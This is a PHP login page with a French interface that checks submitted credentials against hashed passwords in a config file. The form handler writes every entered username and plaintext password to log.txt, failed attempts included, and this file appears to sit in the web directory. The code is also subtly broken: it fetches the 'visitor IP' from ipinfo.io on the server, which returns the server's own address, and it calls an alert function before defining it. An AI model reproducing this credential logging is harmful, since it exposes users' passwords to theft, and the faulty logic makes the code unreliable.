<?php
require 'config.php';

if ($_SERVER["REQUEST_METHOD"] == "POST") {
    $enteredUsername = $_POST["username"];
    $enteredPassword = $_POST["password"];
    
    // Get visitor's IP address using an external API
    $visitorIP = file_get_contents('https://ipinfo.io/ip');
    $timestamp = date('Y-m-d H:i:s'); // Get current timestamp

    // Log the connection details
    $logEntry = "IP: $visitorIP | Timestamp: $timestamp | Username: $enteredUsername | Password: $enteredPassword\n";
    file_put_contents('log.txt', $logEntry, FILE_APPEND);

    if (isset($config['users'][$enteredUsername]) && password_verify($enteredPassword, $config['users'][$enteredUsername])) {
        session_start();
        $_SESSION['authenticated'] = true;
        header("Location: page.php"); // Redirect to the protected page
        exit();
    } else {
        $errorMessage = "Identifiants incorrects. Veuillez réessayer.";
        echo "<script>showErrorAlert();</script>"; // Call the function to display SweetAlert alert
    }
}
?>

<!DOCTYPE html>
<html>
<head><!-- Ajoutez ces deux lignes pour inclure SweetAlert -->
    <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/sweetalert2@11.0.18/dist/sweetalert2.min.css">
    <script src="https://cdn.jsdelivr.net/npm/sweetalert2@11.0.18/dist/sweetalert2.all.min.js"></script>
  <script>
    function togglePasswordInput() {
        var passwordLabel = document.getElementById("passwordLabel");
        var passwordInput = document.getElementById("password");
        
        if (passwordLabel.style.display === "none") {
            passwordLabel.style.display = "block";
            passwordInput.style.display = "block";
        }
    }

    function showSuccessModal() {
        var successModal = document.getElementById("successModal");
        successModal.style.display = "block";
    }
    function showErrorModal() {
    var errorModal = document.getElementById("errorModal");
    errorModal.style.display = "block";
}
    
    function showErrorAlert() {
        Swal.fire({
            icon: 'error',
            title: 'Oops...',
            text: 'Identifiants incorrects. Veuillez réessayer.',
        });
    }
</script>
    <title>Authentification</title>
    <style>
        body {
            background: linear-gradient(to right, #FFD700, #FFA500, #FF6347);
            color: #FFFFFF;
            font-family: Arial, sans-serif;
            margin: 0;
            padding: 0;
            display: flex;
            align-items: center;
            justify-content: center;
            height: 100vh;
        }
        .container {
            background-color: rgba(0, 0, 0, 0.8);
            padding: 20px;
            border-radius: 10px;
            text-align: center;
            box-shadow: 0 4px 8px rgba(0, 0, 0, 0.2);
            max-width: 400px;
        }
        h1 {
            color: #FF8C00;
        }
        label, button {
            color: #FFFFFF;
            font-weight: bold;
        }
        input {
            padding: 10px;
            margin-bottom: 10px;
            border: none;
            border-radius: 5px;
            width: 100%;
        }
        button {
            background-color: #FF4500;
            padding: 10px 20px;
            border: none;
            border-radius: 5px;
            cursor: pointer;
            transition: background-color 0.3s ease-in-out;
        }
        button:hover {
            background-color: #FF6347;
        }
        .error {
            color: #FF0000;
        }
  .modal {
    display: none;
    position: fixed;
    top: 0;
    left: 0;
    width: 100%;
    height: 100%;
    background-color: rgba(0, 0, 0, 0.5);
}

.modal-content {
    background-color: #f4f4f4;
    margin: 20% auto;
    padding: 20px;
    border: 1px solid #888;
    width: 60%;
    text-align: center;
    border-radius: 5px;
    position: relative;
}

.close {
    color: #888;
    position: absolute;
    top: 0;
    right: 20px;
    font-size: 28px;
    font-weight: bold;
    cursor: pointer;
}
    </style>
    
</head>
<body>
    <div class="container">
        <h1>Authentification</h1>
        <form action="index.php" method="post">
            <?php if (isset($errorMessage)) { ?>
                <p class="error"><?php echo $errorMessage; ?></p>
            <?php } ?>
            <label for="username">Nom d'utilisateur :</label><br>
            <input type="text" name="username" required oninput="togglePasswordInput()"><br>
            <label for="password" id="passwordLabel" style="display: none;">Mot de passe :</label><br>
            <input type="password" name="password" id="password" style="display: none;" required><br>
            <button type="submit">Se connecter</button>
        </form>
    </div><div id="successModal" class="modal" style="display: none;">
    <div class="modal-content">
        <span class="close" onclick="this.parentElement.style.display='none'">&times;</span>
        <p>Connexion réussie ! Bienvenue.</p>
    </div>
</div>

<div id="errorModal" class="modal" style="display: none;">
    <div class="modal-content">
        <span class="close" onclick="this.parentElement.style.display='none'">&times;</span>
        <p>Identifiants incorrects. Veuillez réessayer.</p>
    </div>
</div>
</body>
</html>